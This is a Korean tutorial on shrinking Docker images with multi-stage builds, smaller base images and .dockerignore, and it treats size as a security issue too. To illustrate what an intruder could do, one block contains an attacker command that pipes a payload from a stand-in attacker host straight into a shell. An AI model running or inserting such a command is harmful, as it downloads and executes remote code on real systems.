---
title: 운영 이미지에 컴파일러가 들어 있다
summary: 지우기로 못 줄이니 애초에 안 담는 법 — 멀티 스테이지와 베이스 선택
versionNote: Docker 28 · BuildKit 기준
ord: 3
minutes: 25
edges:
  - { to: union-filesystem, type: prerequisite }
  - { to: build-cache, type: deepens }
sources:
  - { label: Docker 공식 문서 - Multi-stage builds, url: https://docs.docker.com/build/building/multi-stage/ }
  - { label: Distroless container images, url: https://github.com/GoogleContainerTools/distroless }
  - { label: Docker 공식 문서 - .dockerignore, url: https://docs.docker.com/build/concepts/context/ }
---

[[union-filesystem]] 에서 결론이 하나 나왔다. **지우기로는 못 줄인다.**
층은 쌓이기만 하고, 삭제는 가리는 것일 뿐이다.

그러면 남은 방법은 하나다. **애초에 안 담는 것.**
이 글은 그 방법들을 본다. 그리고 용량 문제가 **보안 문제이기도 하다**는 것을 본다.

## 0. 들어가기 전에 — 핵심 용어

- **빌드 단계(stage)**: `FROM` 하나로 시작하는 구간. 한 Dockerfile 에 여러 개 둘 수 있다.
- **멀티 스테이지 빌드**: 단계를 나눠, 앞 단계의 **결과물만** 뒤 단계로 가져오는 방식.
- **빌드 컨텍스트**: `docker build` 뒤에 적는 경로의 **전체 내용**. 데몬으로 전송된다.
- **glibc / musl**: 리눅스의 표준 C 라이브러리 두 종류. alpine 은 musl 을 쓴다.
- **distroless**: 셸도 패키지 관리자도 없이 런타임만 담은 베이스 이미지.
- **공격 표면(attack surface)**: 공격자가 쓸 수 있는 것들의 총량.

한 줄 그림: **빌드에 필요한 것과 실행에 필요한 것은 다르다. 섞여 있을 이유가 없다.**

비유하자면 **이사**다. 가구를 조립하려면 드릴, 공구함, 포장재, 설명서가 필요하다.
조립이 끝나면 그것들을 **거실에 쌓아두지 않는다.** 치운다.
그런데 컨테이너 이미지에서는 치우는 것이 불가능하다([[union-filesystem]]).
그래서 **조립을 다른 방에서 하고, 완성된 가구만 거실로 옮긴다.**
그게 멀티 스테이지다.

## 1. 그전엔 어떻게 했나 — 한 단계로 다 하던 시절

Dockerfile 하나에 `FROM` 하나. 빌드도 실행도 같은 이미지에서 한다.

```dockerfile file=Dockerfile
FROM maven:3.9-eclipse-temurin-21
WORKDIR /app
COPY . .
RUN mvn package
CMD ["java", "-jar", "target/app.jar"]
```

동작한다. 그런데 결과물이 이렇다.

```bash file=terminal
$ docker images myapp
REPOSITORY   TAG   SIZE
myapp        1.0   1.42GB     ← jar 는 18MB 다
```

### 고통 1 — 운영에 안 쓰는 것이 대부분이다

1.42GB 에 뭐가 들었는지 보면 이렇다.

```
JDK (컴파일러 포함)       480MB   ← 실행에는 JRE 만 필요
Maven                    120MB   ← 빌드 끝나면 안 쓴다
~/.m2 의존성 캐시         640MB   ← 빌드 끝나면 안 쓴다
소스 코드                  40MB   ← 실행에 안 쓴다
OS 기본 패키지            140MB
내 jar                    18MB   ← 실제로 필요한 것
```

**필요한 것이 1.3%** 다. 나머지는 전송하고 저장하고 스캔하는 비용만 낸다.

### 고통 2 — 공격 표면이 넓다

용량보다 이게 더 아프다. 컨테이너가 뚫렸다고 치자.
안에 **컴파일러와 패키지 관리자와 셸이 다 있다.**

```bash file=terminal bad label="침입자가 쓸 수 있는 것들"
mvn dependency:get -Dartifact=...   # 외부에서 뭐든 받아올 수 있다
javac Exploit.java                   # 안에서 컴파일할 수 있다
curl attacker.com/payload | sh       # 받아서 실행할 수 있다
```

그리고 **취약점 스캔 결과**가 수백 건으로 나온다. 대부분 Maven 과 빌드 도구의 것이고,
운영에서 안 쓰는 코드의 취약점이다. 그런데 **스캔은 그걸 구분하지 못한다.**
진짜 봐야 할 취약점이 소음에 묻힌다.

### 고통 3 — 소스와 비밀이 이미지에 박힌다

`COPY . .` 가 **모든 것**을 가져온다.

```bash file=terminal
$ docker run --rm myapp:1.0 cat /app/.env
DB_PASSWORD=...        # 이미지를 받은 누구나 읽는다
$ docker run --rm myapp:1.0 ls /app/.git
HEAD  config  objects  # 전체 커밋 이력이 들어 있다
```

레지스트리에 올리면 **그걸 받을 수 있는 모두에게 공개**된다.
그리고 [[union-filesystem]] 에서 봤듯이 **나중에 지울 수도 없다.**

세 고통의 뿌리는 **하나**다. **빌드 환경과 실행 환경을 구분하지 않았다.**
필요한 시점이 다른 것들이 한 이미지에 섞여 있다.

## 2. 이렇게 피해봤다 — 한 단계를 유지하면서 줄여보기

### 시도 1 — 빌드 산물을 지운다

```dockerfile file=Dockerfile bad label="안 먹힌다"
RUN mvn package && rm -rf ~/.m2 /app/src
```

층이 다르면 안 줄어들고, 같은 `RUN` 에 묶어도 **JDK 와 Maven 은 베이스 이미지 층**이다.
내가 만든 층이 아니라서 **건드릴 수가 없다.** 고통 1 의 480MB + 120MB 가 그대로다.

### 시도 2 — 호스트에서 빌드하고 결과만 COPY 한다

```dockerfile file=Dockerfile
FROM eclipse-temurin:21-jre
COPY target/app.jar /app/app.jar
```

**작아진다.** 실제로 많이 쓰이던 방법이고 틀린 것도 아니다.
문제는 **빌드가 Docker 밖에서 일어난다**는 것이다.

```
개발자 A 의 Maven 3.8 + JDK 21.0.1  →  jar
CI 서버의 Maven 3.9 + JDK 21.0.5    →  다른 jar
```

PART 1 의 "내 PC 에선 되는데"가 **빌드 단계로 옮겨 재발한다.**
Dockerfile 만 보고는 어떻게 빌드되는지 알 수 없고, 재현도 안 된다.

### 시도 3 — Dockerfile 을 두 개로 나눈다

`Dockerfile.build` 로 빌드하고, 컨테이너에서 jar 를 꺼내고, `Dockerfile.run` 으로 이미지를 만든다.

```bash file=terminal
docker build -f Dockerfile.build -t tmp .
docker create --name x tmp && docker cp x:/app/target/app.jar ./
docker rm x
docker build -f Dockerfile.run -t myapp .
```

**된다.** 빌드도 컨테이너 안에서 하고 이미지도 작다.
그런데 **스크립트 없이는 못 쓴다.** 네 줄의 순서를 사람이 기억해야 하고,
중간에 실패하면 `tmp` 와 `x` 가 남는다. 캐시도 단계 간에 안 이어진다.

> 세 시도의 공통점: **"빌드는 컨테이너 안에서, 결과만 담기"를 하려면 Dockerfile 밖의 접착제가 필요했다.**
> 그 접착제를 Dockerfile 안으로 넣어야 했다.

## 3. 그래서 나온 것 — 한 파일에 단계를 여러 개

Docker 17.05(2017)에서 **멀티 스테이지 빌드**가 들어왔다.
`FROM` 을 여러 번 쓰고, `COPY --from=` 으로 앞 단계의 파일을 가져온다.

```dockerfile file=Dockerfile
# 1단계 — 빌드. 이 단계는 최종 이미지에 안 들어간다
FROM maven:3.9-eclipse-temurin-21 AS build
WORKDIR /src
COPY pom.xml .
RUN mvn dependency:go-offline
COPY src ./src
RUN mvn package -DskipTests

# 2단계 — 실행. 여기부터가 최종 이미지다
FROM eclipse-temurin:21-jre
WORKDIR /app
COPY --from=build /src/target/app.jar ./app.jar
USER 1000
CMD ["java", "-jar", "app.jar"]
```

```bash file=terminal
$ docker images myapp
REPOSITORY   TAG   SIZE
myapp        2.0   214MB     ← 1.42GB 에서
```

세 고통과 대응시켜 보자.

| 고통 | 한 단계 | 멀티 스테이지 |
| --- | --- | --- |
| 안 쓰는 것이 대부분 | 1.42GB 중 18MB 만 필요 | **가져온 것만** 들어간다. 214MB |
| 공격 표면이 넓다 | 컴파일러·Maven·소스 다 있음 | JRE 와 jar 뿐. 컴파일 못 한다 |
| 소스와 비밀이 박힌다 | `.git`, `.env` 가 층에 남음 | 앞 단계에 있고 **최종 이미지에 없다** |

**가리는 것이 아니라 안 가져오는 것**이 핵심이다.
`COPY --from=build` 가 명시적으로 가져온 것만 들어간다.
앞 단계는 통째로 버려지므로 **거기서 무슨 짓을 해도 최종 이미지에 안 남는다.**

두 단계가 어떻게 갈라지고 무엇만 건너오는지 보자.

```visual
id: image-size-stage-split
kind: sequence
title: 두 단계 사이를 건너오는 것은 jar 하나뿐이다
actors: [빌드 단계, 파일 시스템, 실행 단계, 최종 이미지]
messages:
  - { from: 빌드 단계, to: 파일 시스템, label: "FROM maven:3.9 (480MB + 120MB)", note: "JDK 와 Maven 이 깔린다. 컴파일에는 필요하고 실행에는 불필요하다" }
  - { from: 빌드 단계, to: 파일 시스템, label: "mvn dependency:go-offline", note: "의존성 640MB 가 ~/.m2 에 쌓인다. 이것도 실행에는 안 쓴다" }
  - { from: 빌드 단계, to: 파일 시스템, label: "COPY src + mvn package", note: "소스 40MB 가 들어오고 jar 18MB 가 나온다. 여기까지가 1.28GB" }
  - { from: 빌드 단계, to: 실행 단계, label: "COPY --from=build app.jar", note: "건너오는 것은 이 한 줄이 명시한 18MB 뿐이다. 나머지는 가져오라고 안 했으니 안 온다" }
  - { from: 실행 단계, to: 최종 이미지, label: "FROM temurin:21-jre (196MB)", note: "실행 베이스가 최종 이미지의 바닥이 된다. 빌드 단계의 층은 이 쌓임에 아예 끼지 않는다" }
  - { from: 실행 단계, to: 최종 이미지, label: "app.jar 층 (18MB)", note: "최종 214MB. 빌드 단계의 1.28GB 는 호스트 빌드 캐시에만 남고 이미지에는 없다" }
  - { from: 최종 이미지, to: 최종 이미지, label: "javac 도 mvn 도 .git 도 없음", note: "지운 것이 아니라 애초에 담기지 않았다. whiteout 과 결정적으로 다른 지점이다" }
```

중요한 차이가 하나 있다. 빌드 단계의 1.28GB 는 **호스트의 빌드 캐시에는 남는다.**
이미지에 없을 뿐이다. 그래서 두 번째 빌드가 빠르고,
디스크가 찰 때 `docker builder prune` 으로 비우는 대상이 그것이다.

## 4. 어떻게 동작하나 — 세 개의 레버

용량을 줄이는 수단이 셋이다. 효과 크기 순으로 본다.

```visual
id: image-size-three-levers
kind: step
title: 1.42GB 를 줄이는 세 단계
steps:
  - name: 출발 — 한 단계 빌드
    detail: maven 베이스에 소스와 의존성 캐시가 전부 남아 있다. 필요한 jar 는 18MB 인데 1.42GB 를 배포한다
    code: FROM maven:3.9 → 1.42GB
  - name: 레버 1 — 멀티 스테이지 (가장 큰 효과)
    detail: 빌드 단계를 분리하고 jar 만 가져온다. JDK 대신 JRE 베이스를 쓴다. 컴파일러, Maven, 의존성 캐시, 소스가 한꺼번에 사라진다
    code: 1.42GB → 214MB (85% 감소)
  - name: 레버 2 — 베이스 바꾸기
    detail: 실행 베이스를 더 작은 것으로 바꾼다. alpine 계열이나 distroless 다. 여기서부터는 호환성과 디버깅 편의를 내준다
    code: 214MB → 92MB (distroless java21)
  - name: 레버 3 — .dockerignore
    detail: 용량보다 빌드 속도와 보안에 영향이 크다. 컨텍스트 전송량이 줄고, 실수로 비밀이 담기는 경로가 막힌다
    code: 컨텍스트 847MB → 12MB
  - name: 그래서 순서가 중요하다
    detail: 멀티 스테이지를 먼저 한다. 그것만으로 대부분 해결되고, 호환성 위험이 없다. 베이스를 알파인으로 바꾸는 것은 효과가 작고 위험이 크므로 나중이다
    code: 멀티 스테이지 → .dockerignore → 베이스 교체
```

### 레버 2 — 베이스는 고를 때 대가가 있다

작을수록 좋은 것이 아니다. **무엇을 내주는지** 알고 골라야 한다.

```visual
id: image-size-base-choice
kind: playground
title: 베이스를 고를 때 무엇을 내주는가
inputs:
  - { name: 베이스, label: 베이스 이미지, options: [debian / ubuntu, slim, alpine, distroless] }
  - { name: 상황, label: 내 사정, options: [순수 인터프리터 코드, 네이티브 모듈 있음, 운영에서 디버깅 필요, 보안 감사 대상] }
outcomes:
  - when: { 베이스: debian / ubuntu, 상황: 네이티브 모듈 있음 }
    result: 가장 안전한 선택이다. glibc 와 빌드 도구가 다 있어 뭐든 동작한다
    note: 크다는 것이 유일한 단점이다. 멀티 스테이지를 먼저 하면 보통 여기서 멈춰도 충분하다
  - when: { 베이스: slim, 상황: 순수 인터프리터 코드 }
    result: 좋은 기본값이다. glibc 를 유지하면서 문서와 로케일을 뺐다. 호환성 위험이 거의 없다
    note: alpine 으로 가기 전에 여기를 먼저 시도하는 것이 맞다. 효과의 상당 부분을 위험 없이 얻는다
  - when: { 베이스: alpine, 상황: 네이티브 모듈 있음 }
    result: 위험하다. musl libc 라서 glibc 를 전제한 바이너리가 깨지거나 느려진다
    note: Python 의 일부 휠, Node 의 네이티브 애드온이 여기서 터진다. 소스 빌드로 넘어가 빌드가 오히려 느려지는 일도 흔하다
  - when: { 베이스: alpine, 상황: 순수 인터프리터 코드 }
    result: 잘 맞는다. 네이티브 의존이 없으면 musl 차이가 드러나지 않는다
    note: 그래도 DNS 해석 동작과 시간대 데이터 누락 같은 미묘한 차이는 남는다. tzdata 를 따로 깔아야 하는 경우가 많다
  - when: { 베이스: distroless, 상황: 보안 감사 대상 }
    result: 가장 유리하다. 셸도 패키지 관리자도 없어 침입 후 할 수 있는 일이 거의 없다
    note: 취약점 스캔 결과도 극적으로 줄어든다. 운영에 안 쓰는 패키지가 애초에 없기 때문이다
  - when: { 베이스: distroless, 상황: 운영에서 디버깅 필요 }
    result: 아프다. exec 로 들어가도 셸이 없다. ps 도 cat 도 없다
    note: debug 태그를 쓰거나, kubectl debug 로 임시 컨테이너를 붙이는 방식으로 푼다. 그 방법을 미리 익혀둬야 쓸 수 있다
  - when: { 상황: 운영에서 디버깅 필요 }
    result: 베이스를 줄이는 것과 디버깅 편의는 정면으로 충돌한다
    note: 팀이 kubectl debug 같은 대안을 쓸 준비가 됐는지가 선택 기준이다. 준비 없이 distroless 로 가면 장애 때 손이 묶인다
```

### 레버 3 — .dockerignore 는 용량보다 보안이다

```bash file=terminal
$ docker build -t myapp .
Sending build context to Docker daemon  847.3MB
```

이 숫자가 소스 크기보다 크면 뭔가 잘못됐다.
`.git`, `node_modules`, 빌드 산출물, 로컬 설정이 **전부 데몬으로 전송**되고 있다.

```text file=.dockerignore
.git
.gitignore
node_modules
target
build
dist
*.log
.env
.env.*
.vscode
.idea
Dockerfile
docker-compose.yml
README.md
```

`.env` 를 넣는 것이 핵심이다. `COPY . .` 가 있는 Dockerfile 에서
`.dockerignore` 가 없으면 **비밀이 층에 박히고 지울 수 없다.**

그래서 이런 사실이 따라 나온다. **`.dockerignore` 는 Dockerfile 과 같이 커밋해야 한다.**
한쪽만 있으면 의미가 없고, 새로 합류한 사람이 `.env` 를 만들면 바로 샌다.

### 멀티 스테이지의 다른 용도

최종 이미지를 안 만들고 **검사용 단계**를 두는 패턴도 있다.

```dockerfile file=Dockerfile
FROM build AS test
RUN mvn test

FROM build AS lint
RUN mvn checkstyle:check
```

```bash file=terminal
docker build --target test .     # 테스트만 돌린다
docker build --target lint .     # 린트만 돌린다
```

단계는 **병렬로** 실행된다(BuildKit). `test` 와 `lint` 가 서로 의존하지 않으면 동시에 돈다.

## 5. 이것도 끝이 아니다 — 작게 만들었는데 빌드가 느리다

용량은 해결됐다. 그런데 **빌드 시간**이 남는다.

위 Dockerfile 을 보면 `COPY pom.xml` 과 `COPY src` 를 **나눠서** 적었다.
왜 그렇게 썼는지 아직 설명하지 않았다. 한 줄로 `COPY . .` 하면 안 되나.

된다. 대신 **코드 한 줄 고칠 때마다 의존성을 전부 다시 받는다.**
[[image-layers]] 에서 본 "아래가 바뀌면 위는 전부 다시" 규칙이
빌드 쪽에서는 **캐시 무효화**로 나타난다.

그 규칙을 제대로 쓰면 빌드가 5분에서 10초가 된다.
잘못 쓰면 매번 5분이다. 그리고 `RUN` 의 캐시 키에는 **사람을 속이는 함정**이 하나 있다.
[[build-cache]] 에서 본다.

## 자기 점검

- 멀티 스테이지에서 앞 단계의 파일이 최종 이미지에 안 남는 이유는? 가리는 것과 어떻게 다른가?
- 베이스 이미지 층의 Maven 을 `RUN rm` 으로 지울 수 없는 이유는?
- alpine 으로 바꿨더니 바이너리가 안 도는 경우가 생기는 이유는?
- `.dockerignore` 를 용량이 아니라 보안 장치로 설명하면?
- distroless 를 고르기 전에 팀이 준비해야 할 것은 무엇인가?

## 덧 — 흔한 오해

### "작은 이미지가 항상 빠르다"

**받을 때만** 빠르다. 그리고 그건 **처음 한 번**이다.

```
처음 pull  : 작은 이미지가 유리
이후 배포  : 바뀐 층만 받으므로 전체 크기와 무관
```

[[image-layers]] 에서 봤듯이 매 배포의 전송량은 **바뀐 층 크기**다.
베이스를 1GB 에서 100MB 로 줄여도, 매 배포에서 움직이는 2MB 는 그대로다.

작게 만드는 진짜 이득은 **스케일 아웃**과 **보안**이다.
노드 50대에 새로 뜰 때, 그리고 취약점 스캔 결과를 읽을 때 차이가 난다.

### "alpine 을 쓰면 무조건 작아진다"

**베이스만** 작다. 거기에 뭘 깔면 역전될 수 있다.

```
python:3.12-slim   + 네이티브 휠 설치   → 180MB  (미리 빌드된 휠 사용)
python:3.12-alpine + 같은 패키지 설치   → 290MB  (소스 빌드. gcc 설치 필요)
```

alpine 에는 미리 빌드된 바이너리 휠이 없는 경우가 많아서
`gcc`, `musl-dev`, `python3-dev` 를 깔고 컴파일한다.
**더 커지고 더 느려진다.** 특히 Python 과 Node 에서 자주 겪는다.

### "멀티 스테이지면 비밀이 안 샌다"

**최종 이미지에는** 안 샌다. 그런데 두 가지 경로가 남는다.

```dockerfile file=Dockerfile bad label="앞 단계에 남아도 위험한 경우"
FROM alpine AS build
ARG NPM_TOKEN
RUN echo "//registry.npmjs.org/:_authToken=$NPM_TOKEN" > .npmrc
RUN npm install
```

`ARG` 로 넘긴 값은 **빌드 히스토리에 남는다.** 최종 이미지의 config 에서
`docker history` 로 읽히는 경우가 있다. 그리고 **빌드 캐시에도 남는다.**
캐시를 레지스트리에 올려 공유하면 그쪽으로 샌다.

```dockerfile file=Dockerfile good label="시크릿 마운트를 쓴다"
RUN --mount=type=secret,id=npmtoken \
    NPM_TOKEN=$(cat /run/secrets/npmtoken) npm install
```

BuildKit 의 시크릿 마운트는 **층에도 히스토리에도 안 남는다.**
빌드 중에만 파일로 존재하고 사라진다.
